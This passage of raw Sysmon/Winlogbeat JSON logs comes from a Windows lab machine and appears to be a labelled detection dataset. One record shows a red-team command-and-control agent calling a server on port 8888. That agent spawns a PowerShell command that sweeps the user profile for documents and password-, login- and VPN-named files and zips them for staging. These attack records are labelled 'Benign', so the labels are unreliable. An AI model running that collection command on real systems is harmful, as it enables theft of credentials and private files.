(WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8474,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.673Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 10:44:33.673\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gwq0vqyf.cdw.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":8475,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.595Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:44:33.595\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8476,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:35.106Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 10:44:35.106\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive\nCreationUtcTime: 2020-09-26 20:35:42.672\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8477,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:37.062Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:16.910Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-03-23 10:45:16.910\nProcessGuid: {04787c88-fa3c-623a-ff00-000000000c00}\nProcessId: 5596\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: WMI Provider Host\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Wmiprvse.exe\nCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\NETWORK SERVICE\nLogonGuid: {04787c88-ea51-623a-e403-000000000000}\nLogonId: 0x3E4\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1=51B8646308EE0B68AD1F7F1291B85395434DE49A,MD5=801E8003C257C8F540B20F1E0DECD3A6,SHA256=A75C85F3B089993E9C042FB82ECB7757E8F460ED8065FC7991CAA38A6DE0F50C,IMPHASH=CC058866636CC184AD452F88EE39368A\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 816\nParentImage: -\nParentCommandLine: -\nParentUser: -","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5596,"thread":null,"entity_id":"{04787c88-fa3c-623a-ff00-000000000c00}","executable":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","name":"WmiPrvSE.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8478,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:18.719Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:16.952Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-03-23 10:45:16.952\nProcessGuid: {04787c88-fa3c-623a-ff00-000000000c00}\nProcessId: 5596\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nImageLoaded: C:\\Windows\\System32\\wbem\\wmiutils.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: WMI\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmiutils.dll\nHashes: SHA1=BC609D0AE8E4D79DC586A784DA6E660C25411BAE,MD5=9639A13D44802D3060BAB0072EB7945A,SHA256=45446583DDBD1DA38B545603AF62E305F13DD480B09F4A689BE4ADC98BC4A4AF,IMPHASH=0D31E6D27B954AD879CB4DF742982F1A\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\nUser: NT AUTHORITY\\NETWORK SERVICE","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5596,"thread":null,"entity_id":"{04787c88-fa3c-623a-ff00-000000000c00}","executable":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","name":"WmiPrvSE.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8479,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:18.719Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:17.014Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1003,technique_name=Credential Dumping\nEventType: CreateKey\nUtcTime: 2022-03-23 10:45:17.014\nProcessGuid: {04787c88-fa3c-623a-ff00-000000000c00}\nProcessId: 5596\nImage: C:\\Windows\\system32\\wbem\\wmiprvse.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\nUser: NT AUTHORITY\\NETWORK SERVICE","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5596,"thread":null,"entity_id":"{04787c88-fa3c-623a-ff00-000000000c00}","executable":"C:\\Windows\\system32\\wbem\\wmiprvse.exe","name":"wmiprvse.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8480,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:18.719Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:39.569Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:45:39.569\nProcessGuid: {04787c88-fa53-623a-0001-000000000c00}\nProcessId: 6540\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force\"\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6540,"thread":null,"entity_id":"{04787c88-fa53-623a-0001-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8481,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:41.099Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:39.573Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 10:45:39.573\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 168\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-fa53-623a-0001-000000000c00}\nTargetProcessId: 6540\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":168},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8482,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:41.099Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:45:39.603Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:45:39.603\nProcessGuid: {04787c88-fa53-623a-0001-000000000c00}\nProcessId: 6540\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6540,"thread":null,"entity_id":"{04787c88-fa53-623a-0001-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8483,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:45:41.099Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},